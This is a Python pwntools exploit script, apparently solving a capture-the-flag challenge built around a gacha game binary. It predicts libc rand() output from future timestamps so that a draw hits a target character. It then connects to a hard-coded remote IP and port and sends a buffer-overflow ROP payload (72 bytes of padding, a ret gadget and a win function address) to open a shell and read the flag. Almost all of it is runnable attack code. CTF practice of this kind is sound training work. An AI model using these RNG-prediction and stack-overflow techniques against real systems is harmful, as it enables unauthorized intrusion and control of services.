from pwn import *
import ctypes
import time

# Loading binary files, obtaining addresses, and ROP gadgets
elf = ELF('./genshin')
libc = ctypes.CDLL("libc.so.6")

# Assuming you can draw at least 20 times with the initial remote gem (this can be adjusted based on actual circumstances).
MAX_PULLS = 20

def find_target_seed(max_pulls):
    """Search for timestamps and number of draws that can hit Columbina within the next 5 minutes."""
    now = int(time.time())
    for t in range(now, now + 300):  # search future 300 s
        libc.srand(t)
        pity = 0
        primos = max_pulls * 160
        for pull in range(max_pulls):
            primos -= 160
            pity += 1
            if pity > 89:
                local_c = 0
            else:
                local_c = libc.rand() % 1000
            if local_c < 6:  # 5-star
                idx = libc.rand() % 8
                if idx == 7:  # Columbina
                    return t, pull + 1
                pity = 0
            else:
                # consume 4-star/3-star random number
                if local_c < 0x39:
                    libc.rand()
                else:
                    libc.rand()
    return None, None

# Find the best timestamp
print("[*] Searching for suitable seeds in the future...")
target_time, pull_num = find_target_seed(MAX_PULLS)
if target_time is None:
    print("[-] No suitable seed found. Try increasing MAX_PULLS or try again later.")
    exit()

wait_time = target_time - time.time()
print(f"[+] Target time: {target_time}，Wait {wait_time:.1f} s. {pull_num} draws get it.")

# Wait until the target time (connect 0.2 seconds in advance to offset latency)
if wait_time > 0:
    time.sleep(max(0, wait_time - 0.2))

# Connect remotely and draw cards quickly
r = remote('103.236.73.121', 11331) # To obtain the IP address and its port number, view the question.

# Send card draw requests continuously (no need to wait for the complete output of each round, can send them all at once).
for i in range(pull_num):
    r.sendlineafter(b"Choice > ", b"1")

# Waiting for the hidden storyline to trigger
r.recvuntil(b"You seek to change your fate? Sign here...")
r.recv(2)  # Receive prompt > "

# Constructing a ROP chain
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]
abyss_gateway = elf.symbols['abyss_gateway']

payload = b'A' * 72
payload += p64(ret_gadget)
payload += p64(abyss_gateway)

print("[*] Sending overflow payload...")
r.sendline(payload)

# Get shell, read flag
r.interactive()
